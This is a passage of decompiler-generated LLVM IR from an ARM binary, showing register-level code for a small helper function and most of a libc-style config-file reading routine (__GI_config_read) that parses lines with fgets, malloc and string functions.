  %v4_15074 = icmp eq i32 %v2_15074, 0
  store i32 %v2_15070, i32* %v2_15054, align 4
  %v0_1507c = load i32, i32* %ip.global-to-local, align 4
  %v1_1507c = load i32, i32* @r5, align 4
  %v2_1507c = add i32 %v1_1507c, 16
  %v3_1507c = inttoptr i32 %v2_1507c to i32*
  store i32 %v0_1507c, i32* %v3_1507c, align 4
  br i1 %v4_15074, label %dec_label_pc_15024, label %dec_label_pc_15084

dec_label_pc_15084:                               ; preds = %dec_label_pc_15054, %.thread
  %v0_15090 = load i32, i32* @r6, align 4
  %v2_15090 = add i32 %v0_15090, 44
  %v3_15090 = inttoptr i32 %v2_15090 to i32*
  %v4_15090 = load i32, i32* %v3_15090, align 4
  store i32 %v4_15090, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15090)
  %v0_1509c = load i32, i32* @r4, align 4
  ret i32 %v0_1509c

; uselistorder directives
  uselistorder i32 %v2_1505c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_15078, { 1, 0 }
  uselistorder i32 %v6_15024, { 1, 0 }
  uselistorder i32 %v0_15024, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_15054, { 1, 0 }
}

define i32 @function_150b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_150b0:
  %v0_150b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_150b0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_150b0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_150b0, %bb
  %v4_150bc = phi i32 [ %arg1, %dec_label_pc_150b0 ], [ 0, %bb ]
  ret i32 %v4_150bc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_150c0 = load i32, i32* @r4, align 4
  %v6_150c0 = load i32, i32* @r5, align 4
  %v9_150c0 = load i32, i32* @r6, align 4
  %v12_150c0 = load i32, i32* @r7, align 4
  %v15_150c0 = load i32, i32* @r8, align 4
  %v18_150c0 = load i32, i32* @sb, align 4
  %v21_150c0 = load i32, i32* @sl, align 4
  %v24_150c0 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_150c4 = icmp eq i32* %arg1, null
  store i1 %v2_150c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_150c4, label %dec_label_pc_153d4, label %dec_label_pc_150dc

dec_label_pc_150dc:                               ; preds = %entry
  %v1_150dc = urem i32 %arg3, 256
  store i32 %v1_150dc, i32* @sb, align 4
  %v1_150e0 = udiv i32 %arg3, 256
  %v3_150e4 = urem i32 %v1_150e0, 256
  %v3_150e8 = mul nuw nsw i32 %v1_150dc, 4
  %v1_150f0 = or i32 %v3_150e8, 1
  %v1_150fc = and i32 %arg3, 131072
  %v1_15100 = add nsw i32 %v1_150dc, -1
  %v1_1510c = and i32 %arg3, 262144
  store i32 %v1_1510c, i32* %r2.global-to-local, align 4
  %v1_15110 = and i32 %arg3, 65536
  store i32 %v1_15110, i32* %r3.global-to-local, align 4
  store i32 %v1_15110, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_15120 = add i32 %arg4, 1
  store i32 %v1_15120, i32* @sl, align 4
  %v2_15298 = icmp eq i32 %v1_150fc, 0
  %v1_152f0 = inttoptr i32 %arg2 to i32*
  %v2_15308 = icmp eq i32 %v1_1510c, 0
  br label %dec_label_pc_15124

dec_label_pc_15124:                               ; preds = %dec_label_pc_15124.backedge, %dec_label_pc_150dc
  %v2_15140 = phi i32 [ %v0_15124.pre, %dec_label_pc_15124.backedge ], [ %tmp, %dec_label_pc_150dc ]
  %v1_15124 = add i32 %v2_15140, 4
  %v2_15124 = inttoptr i32 %v1_15124 to i32*
  %v3_15124 = load i32, i32* %v2_15124, align 4
  store i32 %v3_15124, i32* %r3.global-to-local, align 4
  %v2_15128 = icmp eq i32 %v3_15124, 0
  store i1 %v2_15128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15128, label %dec_label_pc_15130, label %dec_label_pc_15178

dec_label_pc_15130:                               ; preds = %dec_label_pc_15124
  %v1_15130 = add i32 %v2_15140, 16
  %v2_15130 = inttoptr i32 %v1_15130 to i32*
  %v3_15130 = load i32, i32* %v2_15130, align 4
  store i32 %v3_15130, i32* %r3.global-to-local, align 4
  %v2_15134 = icmp eq i32 %v3_15130, 0
  store i1 %v2_15134, i1* %cpsr_z.global-to-local, align 1
  %v1_15138 = add i32 %v2_15140, 8
  %v2_15138 = inttoptr i32 %v1_15138 to i32*
  %v3_15138 = load i32, i32* %v2_15138, align 4
  store i32 %v3_15138, i32* %r3.global-to-local, align 4
  br i1 %v2_15134, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_15130
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_15130, align 4
  %v0_15144.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_15130, %bb
  %v0_15144 = phi i32 [ %v0_15144.pre, %bb ], [ %v3_15138, %dec_label_pc_15130 ]
  %v2_15144 = icmp eq i32 %v0_15144, 0
  store i1 %v2_15144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15144, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_150f0, i32* %r3.global-to-local, align 4
  %v2_1514c = load i32, i32* @r5, align 4
  %v3_1514c = add i32 %v2_1514c, 8
  %v4_1514c = inttoptr i32 %v3_1514c to i32*
  store i32 %v1_150f0, i32* %v4_1514c, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_15150 = load i32, i32* @r5, align 4
  %v1_15150 = add i32 %v0_15150, 16
  %v2_15150 = inttoptr i32 %v1_15150 to i32*
  %v3_15150 = load i32, i32* %v2_15150, align 4
  store i32 %v3_15150, i32* %r0.global-to-local, align 4
  %v1_15154 = add i32 %v0_15150, 8
  %v2_15154 = inttoptr i32 %v1_15154 to i32*
  %v3_15154 = load i32, i32* %v2_15154, align 4
  store i32 %v3_15154, i32* %r3.global-to-local, align 4
  %v2_15158 = add i32 %v3_15154, %v3_15150
  store i32 %v2_15158, i32* %r0.global-to-local, align 4
  %v1_1515c = call i32 @malloc(i32 %v2_15158)
  store i32 %v1_1515c, i32* %r0.global-to-local, align 4
  %v2_15160 = icmp eq i32 %v1_1515c, 0
  store i1 %v2_15160, i1* %cpsr_z.global-to-local, align 1
  %v1_15164 = load i32, i32* @r5, align 4
  %v2_15164 = add i32 %v1_15164, 4
  %v3_15164 = inttoptr i32 %v2_15164 to i32*
  store i32 %v1_1515c, i32* %v3_15164, align 4
  br i1 %v2_15160, label %dec_label_pc_153d4, label %dec_label_pc_1516c

dec_label_pc_1516c:                               ; preds = %.thread
  %v0_1516c = load i32, i32* @r5, align 4
  %v1_1516c = add i32 %v0_1516c, 20
  %v2_1516c = inttoptr i32 %v1_1516c to i32*
  %v3_1516c = load i32, i32* %v2_1516c, align 4
  %v1_15170 = or i32 %v3_1516c, 1
  store i32 %v1_15170, i32* %r3.global-to-local, align 4
  store i32 %v1_15170, i32* %v2_1516c, align 4
  %v0_15178.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15178

dec_label_pc_15178:                               ; preds = %dec_label_pc_15124, %dec_label_pc_1516c
  %v1_15180 = phi i32 [ %v2_15140, %dec_label_pc_15124 ], [ %v0_15178.pre, %dec_label_pc_1516c ]
  %v1_15178 = add i32 %v1_15180, 4
  %v2_15178 = inttoptr i32 %v1_15178 to i32*
  %v3_15178 = load i32, i32* %v2_15178, align 4
  store i32 %v3_15178, i32* %r2.global-to-local, align 4
  %v4_15178 = add i32 %v1_15180, 8
  %v5_15178 = inttoptr i32 %v4_15178 to i32*
  %v6_15178 = load i32, i32* %v5_15178, align 4
  %v2_1517c = add i32 %v6_15178, %v3_15178
  store i32 %v2_1517c, i32* %r3.global-to-local, align 4
  %v2_15180 = add i32 %v1_15180, 12
  %v3_15180 = inttoptr i32 %v2_15180 to i32*
  store i32 %v2_1517c, i32* %v3_15180, align 4
  %v0_15184 = load i32, i32* @fp, align 4
  store i32 %v0_15184, i32* @r6, align 4
  br label %dec_label_pc_15188

dec_label_pc_15188:                               ; preds = %dec_label_pc_15214, %dec_label_pc_15200, %dec_label_pc_15178
  %v0_15190 = phi i32 [ %v0_15184, %dec_label_pc_15178 ], [ %v1_15200, %dec_label_pc_15200 ], [ %v0_15190.pre.pre, %dec_label_pc_15214 ]
  %v0_15188 = load i32, i32* @r5, align 4
  %v1_15188 = add i32 %v0_15188, 12
  store i32 %v1_15188, i32* %r0.global-to-local, align 4
  %v1_1518c = inttoptr i32 %v1_15188 to i32*
  %v2_1518c = load i32, i32* %v1_1518c, align 4
  store i32 %v2_1518c, i32* %r0.global-to-local, align 4
  %v3_1518c = add i32 %v0_15188, 16
  %v4_1518c = inttoptr i32 %v3_1518c to i32*
  %v5_1518c = load i32, i32* %v4_1518c, align 4
  %v2_15190 = add i32 %v2_1518c, %v0_15190
  store i32 %v2_15190, i32* %r0.global-to-local, align 4
  %v2_15194 = sub i32 %v5_1518c, %v0_15190
  %v1_15198 = inttoptr i32 %v0_15188 to i32*
  %v2_15198 = load i32, i32* %v1_15198, align 4
  store i32 %v2_15198, i32* %r2.global-to-local, align 4
  %v3_1519c = call i32 @fgets(i32 %v2_15190, i32 %v2_15194, i32 %v2_15198)
  store i32 %v3_1519c, i32* %r0.global-to-local, align 4
  store i32 %v3_1519c, i32* %r4.global-to-local, align 4
  %v2_151a0 = icmp eq i32 %v3_1519c, 0
  store i1 %v2_151a0, i1* %cpsr_z.global-to-local, align 1
  %v0_151a8 = load i32, i32* @r5, align 4
  %v1_151a8 = add i32 %v0_151a8, 12
  br i1 %v2_151a0, label %dec_label_pc_151a8, label %dec_label_pc_151c0

dec_label_pc_151a8:                               ; preds = %dec_label_pc_15188
  store i32 %v1_151a8, i32* %r0.global-to-local, align 4
  %v1_151ac = inttoptr i32 %v1_151a8 to i32*
  %v2_151ac = load i32, i32* %v1_151ac, align 4
  store i32 %v2_151ac, i32* %r0.global-to-local, align 4
  %v3_151ac = add i32 %v0_151a8, 16
  %v4_151ac = inttoptr i32 %v3_151ac to i32*
  %v5_151ac = load i32, i32* %v4_151ac, align 4
  store i32 %v5_151ac, i32* %r2.global-to-local, align 4
  %v3_151b4 = inttoptr i32 %v2_151ac to i8*
  %v4_151b4 = call i32 @__GI_memset(i8* %v3_151b4, i32 0, i32 %v5_151ac)
  store i32 %v4_151b4, i32* %r0.global-to-local, align 4
  %v0_151b8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_153d8

dec_label_pc_151c0:                               ; preds = %dec_label_pc_15188
  %v2_151c0 = inttoptr i32 %v1_151a8 to i32*
  %v3_151c0 = load i32, i32* %v2_151c0, align 4
  store i32 %v3_151c0, i32* @r4, align 4
  %v1_151c4 = load i32, i32* @r6, align 4
  %v2_151c4 = add i32 %v1_151c4, %v3_151c0
  %v3_151c4 = inttoptr i32 %v2_151c4 to i8*
  store i32 %v2_151c4, i32* %r0.global-to-local, align 4
  %v3_151c8 = call i32 @strlen(i8* %v3_151c4)
  %v0_151d0 = load i32, i32* @r6, align 4
  %v2_151d0 = add i32 %v0_151d0, %v3_151c8
  store i32 %v2_151d0, i32* @r6, align 4
  %v0_151d4 = load i32, i32* @r4, align 4
  store i32 %v0_151d4, i32* @r0, align 4
  %v2_151d8 = call i32 @__GI_strchr(i32 %v0_151d4, i32 10)
  store i32 %v2_151d8, i32* %r0.global-to-local, align 4
  %v2_151dc = icmp eq i32 %v2_151d8, 0
  store i1 %v2_151dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_151dc, label %dec_label_pc_15208, label %dec_label_pc_151e4

dec_label_pc_151e4:                               ; preds = %dec_label_pc_151c0
  %v1_151e4 = inttoptr i32 %v2_151d8 to i8*
  %v2_151e4 = load i8, i8* %v1_151e4, align 1
  %v3_151e4 = zext i8 %v2_151e4 to i32
  %v1_151e8 = add nuw nsw i32 %v3_151e4, 255
  %v1_151ec = urem i32 %v1_151e8, 256
  store i32 %v1_151ec, i32* %r3.global-to-local, align 4
  %v7_151f0 = icmp eq i32 %v1_151ec, 92
  store i1 %v7_151f0, i1* %cpsr_z.global-to-local, align 1
  %v1_151f4 = trunc i32 %v1_151e8 to i8
  store i8 %v1_151f4, i8* %v1_151e4, align 1
  %v0_151f8 = load i32, i32* @r6, align 4
  %v1_151f8 = add i32 %v0_151f8, -1
  store i32 %v1_151f8, i32* @r6, align 4
  %v0_151fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_151fc, label %dec_label_pc_15200, label %dec_label_pc_1528c

dec_label_pc_15200:                               ; preds = %dec_label_pc_151e4
  %v1_15200 = add i32 %v0_151f8, -2
  store i32 %v1_15200, i32* @r6, align 4
  br label %dec_label_pc_15188

dec_label_pc_15208:                               ; preds = %dec_label_pc_151c0
  %v0_15208 = load i32, i32* @r5, align 4
  %v1_15208 = add i32 %v0_15208, 20
  %v2_15208 = inttoptr i32 %v1_15208 to i32*
  %v3_15208 = load i32, i32* %v2_15208, align 4
  store i32 %v3_15208, i32* %r3.global-to-local, align 4
  %v2_1520c = icmp eq i32 %v3_15208, 0
  store i1 %v2_1520c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1520c, label %dec_label_pc_15244, label %dec_label_pc_15214

dec_label_pc_15214:                               ; preds = %dec_label_pc_15208
  %v1_15214 = add i32 %v0_15208, 16
  %v2_15214 = inttoptr i32 %v1_15214 to i32*
  %v3_15214 = load i32, i32* %v2_15214, align 4
  store i32 %v3_15214, i32* %r3.global-to-local, align 4
  %v1_15218 = add i32 %v0_15208, 8
  %v2_15218 = inttoptr i32 %v1_15218 to i32*
  %v3_15218 = load i32, i32* %v2_15218, align 4
  %v1_1521c = add i32 %v3_15214, 4096
  store i32 %v1_1521c, i32* %r3.global-to-local, align 4
  %v2_15220 = add i32 %v3_15218, %v1_1521c
  store i32 %v1_1521c, i32* %v2_15214, align 4
  %v0_15228 = load i32, i32* @r5, align 4
  %v1_15228 = add i32 %v0_15228, 4
  %v2_15228 = inttoptr i32 %v1_15228 to i32*
  %v3_15228 = load i32, i32* %v2_15228, align 4
  store i32 %v3_15228, i32* %r0.global-to-local, align 4
  %v4_1522c = inttoptr i32 %v3_15228 to i32*
  %v5_1522c = call i32 @realloc(i32* %v4_1522c, i32 %v2_15220, i32 %v2_15198, i32 %v1_1521c)
  store i32 %v5_1522c, i32* %r0.global-to-local, align 4
  %v0_15230 = load i32, i32* @r5, align 4
  %v1_15230 = add i32 %v0_15230, 8
  %v2_15230 = inttoptr i32 %v1_15230 to i32*
  %v3_15230 = load i32, i32* %v2_15230, align 4
  %v2_15234 = add i32 %v3_15230, %v5_1522c
  store i32 %v2_15234, i32* %r3.global-to-local, align 4
  %v2_15238 = add i32 %v0_15230, 12
  %v3_15238 = inttoptr i32 %v2_15238 to i32*
  store i32 %v2_15234, i32* %v3_15238, align 4
  %v1_1523c = load i32, i32* @r5, align 4
  %v2_1523c = add i32 %v1_1523c, 4
  %v3_1523c = inttoptr i32 %v2_1523c to i32*
  store i32 %v5_1522c, i32* %v3_1523c, align 4
  %v0_15190.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15188

dec_label_pc_15244:                               ; preds = %dec_label_pc_15208, %.dec_label_pc_15244_crit_edge
  %v0_15244 = phi i32 [ %v0_15244.pre, %.dec_label_pc_15244_crit_edge ], [ %v0_15208, %dec_label_pc_15208 ]
  %v1_15244 = inttoptr i32 %v0_15244 to i32*
  %v2_15244 = load i32, i32* %v1_15244, align 4
  store i32 %v2_15244, i32* @r1, align 4
  %v1_15248 = add i32 %v2_15244, 52
  %v2_15248 = inttoptr i32 %v1_15248 to i32*
  %v3_15248 = load i32, i32* %v2_15248, align 4
  store i32 %v3_15248, i32* %r3.global-to-local, align 4
  %v2_1524c = icmp eq i32 %v3_15248, 0
  store i1 %v2_1524c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1524c, label %dec_label_pc_15278, label %dec_label_pc_15254

dec_label_pc_15254:                               ; preds = %dec_label_pc_15244
  %v1_15254 = add i32 %v2_15244, 16
  %v2_15254 = inttoptr i32 %v1_15254 to i32*
  %v3_15254 = load i32, i32* %v2_15254, align 4
  store i32 %v3_15254, i32* %r2.global-to-local, align 4
  %v1_15258 = add i32 %v2_15244, 24
  %v2_15258 = inttoptr i32 %v1_15258 to i32*
  %v3_15258 = load i32, i32* %v2_15258, align 4
  store i32 %v3_15258, i32* %r3.global-to-local, align 4
  %v3_1525c = icmp ult i32 %v3_15254, %v3_15258
  %v9_1525c = icmp eq i32 %v3_15254, %v3_15258
  store i1 %v9_1525c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1525c, label %dec_label_pc_15280thread-pre-split, label %dec_label_pc_1526c

dec_label_pc_1526c:                               ; preds = %dec_label_pc_15254
  store i32 %v2_15244, i32* %r0.global-to-local, align 4
  %v1_15270 = inttoptr i32 %v2_15244 to i16*
  %v2_15270 = call i32 @getc_unlocked(i16* %v1_15270)
  store i32 %v2_15270, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15280

dec_label_pc_15278:                               ; preds = %dec_label_pc_15244
  store i32 %v2_15244, i32* %r0.global-to-local, align 4
  %v1_1527c = call i32 @__GI_fgetc(i32 %v2_15244)
  store i32 %v1_1527c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15280

dec_label_pc_15280thread-pre-split:               ; preds = %dec_label_pc_15254
  %v2_15260 = inttoptr i32 %v3_15254 to i8*
  %v3_15260 = load i8, i8* %v2_15260, align 1
  %v4_15260 = zext i8 %v3_15260 to i32
  store i32 %v4_15260, i32* %r0.global-to-local, align 4
  %v6_15260 = add i32 %v3_15254, 1
  store i32 %v6_15260, i32* %r2.global-to-local, align 4
  store i32 %v6_15260, i32* %v2_15254, align 4
  %v0_15280.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15280

dec_label_pc_15280:                               ; preds = %dec_label_pc_15280thread-pre-split, %dec_label_pc_1526c, %dec_label_pc_15278
  %v1_15284 = phi i32 [ %v0_15280.pr, %dec_label_pc_15280thread-pre-split ], [ %v2_15270, %dec_label_pc_1526c ], [ %v1_1527c, %dec_label_pc_15278 ]
  %v7_15280 = icmp eq i32 %v1_15284, 10
  store i1 %v7_15280, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15280, label %dec_label_pc_1528c.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_15280
  %v8_15284 = icmp eq i32 %v1_15284, -1
  store i1 %v8_15284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15284, label %dec_label_pc_1528c.loopexit, label %.dec_label_pc_15244_crit_edge

.dec_label_pc_15244_crit_edge:                    ; preds = %bb66
  %v0_15244.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15244

dec_label_pc_1528c.loopexit:                      ; preds = %bb66, %dec_label_pc_15280
  %v0_1528c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1528c

dec_label_pc_1528c:                               ; preds = %dec_label_pc_151e4, %dec_label_pc_1528c.loopexit
  %v0_1528c = phi i32 [ %v0_1528c.pre, %dec_label_pc_1528c.loopexit ], [ %v1_151f8, %dec_label_pc_151e4 ]
  %v7_1528c = icmp eq i32 %v0_1528c, -1
  store i1 %v7_1528c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1528c, label %dec_label_pc_153d4, label %dec_label_pc_15294

dec_label_pc_15294:                               ; preds = %dec_label_pc_1528c
  store i32 %v1_150fc, i32* %r3.global-to-local, align 4
  store i1 %v2_15298, i1* %cpsr_z.global-to-local, align 1
  %v0_1529c = load i32, i32* @r5, align 4
  %v1_1529c = add i32 %v0_1529c, 12
  %v2_1529c = inttoptr i32 %v1_1529c to i32*
  %v3_1529c = load i32, i32* %v2_1529c, align 4
  store i32 %v3_1529c, i32* @r4, align 4
  br i1 %v2_15298, label %dec_label_pc_152b4, label %dec_label_pc_152a4

dec_label_pc_152a4:                               ; preds = %dec_label_pc_15294
  store i32 %v3_1529c, i32* @r0, align 4
  %v0_152a8 = load i32, i32* @sl, align 4
  %v2_152ac = inttoptr i32 %v3_1529c to i8*
  %v3_152ac = call i32 @__GI_strspn(i8* %v2_152ac, i32 %v0_152a8)
  store i32 %v3_152ac, i32* %r0.global-to-local, align 4
  %v0_152b0 = load i32, i32* @r4, align 4
  %v2_152b0 = add i32 %v0_152b0, %v3_152ac
  store i32 %v2_152b0, i32* @r4, align 4
  br label %dec_label_pc_152b4

dec_label_pc_152b4:                               ; preds = %dec_label_pc_15294, %dec_label_pc_152a4
  %v0_152b4 = phi i32 [ %v3_1529c, %dec_label_pc_15294 ], [ %v2_152b0, %dec_label_pc_152a4 ]
  %v1_152b4 = inttoptr i32 %v0_152b4 to i8*
  %v2_152b4 = load i8, i8* %v1_152b4, align 1
  %v3_152b4 = zext i8 %v2_152b4 to i32
  store i32 %v3_152b4, i32* %r2.global-to-local, align 4
  %v2_152b8 = icmp eq i8 %v2_152b4, 0
  store i1 %v2_152b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_152b8, label %dec_label_pc_15124.backedge, label %dec_label_pc_152c0

dec_label_pc_15124.backedge:                      ; preds = %dec_label_pc_152b4, %dec_label_pc_152c0, %dec_label_pc_153cc
  %v0_15124.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15124

dec_label_pc_152c0:                               ; preds = %dec_label_pc_152b4
  %v0_152c0 = load i32, i32* @r7, align 4
  %v1_152c0 = inttoptr i32 %v0_152c0 to i8*
  %v2_152c0 = load i8, i8* %v1_152c0, align 1
  %v3_152c0 = zext i8 %v2_152c0 to i32
  store i32 %v3_152c0, i32* %r3.global-to-local, align 4
  %v9_152c4 = icmp eq i8 %v2_152c0, %v2_152b4
  store i1 %v9_152c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_152c4, label %dec_label_pc_15124.backedge, label %dec_label_pc_152cc

dec_label_pc_152cc:                               ; preds = %dec_label_pc_152c0
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_152d0 = load i32, i32* @r5, align 4
  %v1_152d0 = add i32 %v0_152d0, 4
  %v2_152d0 = inttoptr i32 %v1_152d0 to i32*
  %v3_152d0 = load i32, i32* %v2_152d0, align 4
  store i32 %v3_152d0, i32* %r0.global-to-local, align 4
  %v0_152d4 = load i32, i32* @fp, align 4
  store i32 %v3_152d0, i32* %v1_152f0, align 4
  store i32 %v3_150e8, i32* %r2.global-to-local, align 4
  %v3_152e0 = inttoptr i32 %v3_152d0 to i8*
  %v4_152e0 = call i32 @__GI_memset(i8* %v3_152e0, i32 %v0_152d4, i32 %v3_150e8)
  store i32 %v4_152e0, i32* %r0.global-to-local, align 4
  %v0_152e4 = load i32, i32* @fp, align 4
  store i32 %v0_152e4, i32* @r6, align 4
  %v0_153a412 = load i32, i32* @r4, align 4
  %v1_153a413 = inttoptr i32 %v0_153a412 to i8*
  %v2_153a414 = load i8, i8* %v1_153a413, align 1
  %v3_153a415 = zext i8 %v2_153a414 to i32
  store i32 %v3_153a415, i32* %r2.global-to-local, align 4
  %v2_153a816 = icmp eq i8 %v2_153a414, 0
  store i1 %v2_153a816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_153a816, label %dec_label_pc_153c0, label %dec_label_pc_153b0

dec_label_pc_152ec:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_152f0 = load i32, i32* %v1_152f0, align 4
  store i32 %v2_152f0, i32* %r3.global-to-local, align 4
  store i32 %v1_15100, i32* %r2.global-to-local, align 4
  %v9_152f8 = icmp eq i32 %v2_152fc, %v1_15100
  store i1 %v9_152f8, i1* %cpsr_z.global-to-local, align 1
  %v5_152fc = mul i32 %v2_152fc, 4
  %v6_152fc = add i32 %v2_152f0, %v5_152fc
  %v7_152fc = inttoptr i32 %v6_152fc to i32*
  store i32 %v0_152fc, i32* %v7_152fc, align 4
  br i1 %v9_152f8, label %dec_label_pc_15304, label %dec_label_pc_15310

dec_label_pc_15304:                               ; preds = %dec_label_pc_152ec
  store i32 %v1_1510c, i32* %r3.global-to-local, align 4
  store i1 %v2_15308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15308, label %dec_label_pc_15310, label %dec_label_pc_15330

dec_label_pc_15310:                               ; preds = %dec_label_pc_15304, %dec_label_pc_152ec
  %v0_15310 = load i32, i32* @r7, align 4
  %v1_15310 = inttoptr i32 %v0_15310 to i8*
  %v2_15310 = load i8, i8* %v1_15310, align 1
  %v3_15310 = zext i8 %v2_15310 to i32
  store i32 %v3_15310, i32* %r3.global-to-local, align 4
  %v2_15314 = icmp eq i8 %v2_15310, 0
  store i1 %v2_15314, i1* %cpsr_z.global-to-local, align 1
  %v0_15318 = load i32, i32* @r4, align 4
  store i32 %v0_15318, i32* @r0, align 4
  %v1_1531c = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_15314, i32 %v1_1531c, i32 %v0_15310
  store i32 %storemerge, i32* @r1, align 4
  %v0_15324 = call i32 @strcspn()
  store i32 %v0_15324, i32* %r0.global-to-local, align 4
  %v0_15328 = load i32, i32* @r4, align 4
  %v2_15328 = add i32 %v0_15328, %v0_15324
  store i32 %v2_15328, i32* @r4, align 4
  br label %dec_label_pc_15368

dec_label_pc_15330:                               ; preds = %dec_label_pc_15304
  %v0_15330 = load i32, i32* @r4, align 4
  store i32 %v0_15330, i32* @r0, align 4
  %v0_15334 = load i32, i32* @r7, align 4
  %v1_15334 = inttoptr i32 %v0_15334 to i8*
  %v2_15334 = load i8, i8* %v1_15334, align 1
  %v3_15334 = zext i8 %v2_15334 to i32
  %v5_15338 = call i32 @__GI_strchrnul(i32 %v0_15330, i32 %v3_15334, i32 %v1_15100, i32 %v1_1510c)
  store i32 %v5_15338, i32* %r0.global-to-local, align 4
  store i32 %v1_150fc, i32* %r2.global-to-local, align 4
  store i1 %v2_15298, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_15338, i32* @r4, align 4
  br i1 %v2_15298, label %dec_label_pc_15368, label %dec_label_pc_15354

dec_label_pc_15350:                               ; preds = %dec_label_pc_15354
  %v1_15350 = add i32 %v0_15368.pre, -1
  store i32 %v1_15350, i32* @r4, align 4
  br label %dec_label_pc_15354

dec_label_pc_15354:                               ; preds = %dec_label_pc_15330, %dec_label_pc_15350
  %v0_15354 = phi i32 [ %v1_15350, %dec_label_pc_15350 ], [ %v5_15338, %dec_label_pc_15330 ]
  %v1_15354 = add i32 %v0_15354, -1
  %v2_15354 = inttoptr i32 %v1_15354 to i8*
  %v3_15354 = load i8, i8* %v2_15354, align 1
  %v4_15354 = zext i8 %v3_15354 to i32
  %v0_15358 = load i32, i32* @sl, align 4
  store i32 %v0_15358, i32* @r0, align 4
  %v2_1535c = call i32 @__GI_strchr(i32 %v0_15358, i32 %v4_15354)
  store i32 %v2_1535c, i32* %r0.global-to-local, align 4
  %v2_15360 = icmp eq i32 %v2_1535c, 0
  store i1 %v2_15360, i1* %cpsr_z.global-to-local, align 1
  %v0_15368.pre = load i32, i32* @r4, align 4
  br i1 %v2_15360, label %dec_label_pc_15368, label %dec_label_pc_15350

dec_label_pc_15368:                               ; preds = %dec_label_pc_15354, %dec_label_pc_15330, %dec_label_pc_15310
  %v3_15374 = phi i32 [ %v5_15338, %dec_label_pc_15330 ], [ %v2_15328, %dec_label_pc_15310 ], [ %v0_15368.pre, %dec_label_pc_15354 ]
  %v1_15368 = inttoptr i32 %v3_15374 to i8*
  %v2_15368 = load i8, i8* %v1_15368, align 1
  %v3_15368 = zext i8 %v2_15368 to i32
  store i32 %v3_15368, i32* %r2.global-to-local, align 4
  %v0_1536c = load i32, i32* @r7, align 4
  %v1_1536c = inttoptr i32 %v0_1536c to i8*
  %v2_1536c = load i8, i8* %v1_1536c, align 1
  %v3_1536c = zext i8 %v2_1536c to i32
  store i32 %v3_1536c, i32* %r3.global-to-local, align 4
  %v9_15370 = icmp eq i8 %v2_1536c, %v2_15368
  store i1 %v9_15370, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15370, label %bb69, label %dec_label_pc_1537c

bb69:                                             ; preds = %dec_label_pc_15368
  %v1_15374 = load i32, i32* @fp, align 4
  %v2_15374 = trunc i32 %v1_15374 to i8
  store i8 %v2_15374, i8* %v1_15368, align 1
  %v0_15378.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15378.pr, label %bb71, label %.dec_label_pc_1537c_crit_edge

.dec_label_pc_1537c_crit_edge:                    ; preds = %bb69
  %v0_1537c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1537c

